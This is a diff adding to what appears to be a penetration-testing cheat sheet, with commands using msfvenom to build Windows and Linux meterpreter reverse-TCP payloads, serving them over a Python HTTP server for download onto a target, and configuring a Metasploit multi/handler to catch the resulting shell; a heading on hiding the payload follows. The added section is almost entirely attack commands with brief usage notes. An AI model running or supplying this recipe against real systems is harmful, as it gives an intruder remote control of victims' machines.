@@ -393,9 +393,43 @@ nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:
 
 
 #### Payload:
+
 ```shell
-set payload windows/meterpreter/reverse_tcp
+msfvenom --list payloads
 ```
+> show the list of payloads
+
+```shell
+msfvenom --list formats
+```
+> this is use to show the formats of payload
+
+***Window payload***
+```shell
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<my-ip> LPORT= 1234 -f exe > payload.exe
+```
+> msfvenom payload. `x86` for 32 bit and `x64` is for 64 bit
+
+***Linux payload***
+
+```shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<my-ip> LPORT= 1234 -f elf > payload
+chmod +x payload
+```
+
+```shell
+sudo python -m SimpleHTTPServer 80
+```
+> first open the directory which you have a payload and serve that directory in http server to download payload in target system. open target system browser `http://<my-ip>:80`. 
+
+```shell
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <my-ip>
+set LPORT 1234
+run
+```
+> After deliver payload
 
 #### hide payload in window
 ```shell
